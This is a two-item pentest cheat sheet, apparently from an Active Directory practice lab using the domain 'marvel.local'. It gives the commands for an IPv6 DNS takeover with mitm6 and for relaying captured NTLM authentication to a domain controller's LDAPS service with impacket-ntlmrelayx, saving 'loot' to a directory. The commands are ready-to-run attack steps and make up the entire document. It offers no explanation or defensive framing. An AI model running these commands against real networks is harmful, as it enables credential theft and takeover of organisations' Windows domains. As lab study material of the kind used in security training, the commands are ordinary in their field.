
# Start a relay
```bash
impacket-ntlmrelayx -6 -t ldaps://<dc-ip> -wh whatever.marvel.local -l lootme
```

-----------------------

# Start mitm6 tool and loot hashes
https://github.com/dirkjanm/mitm6
```bash
sudo mitm6 -d marvel.local
```

-----------------------
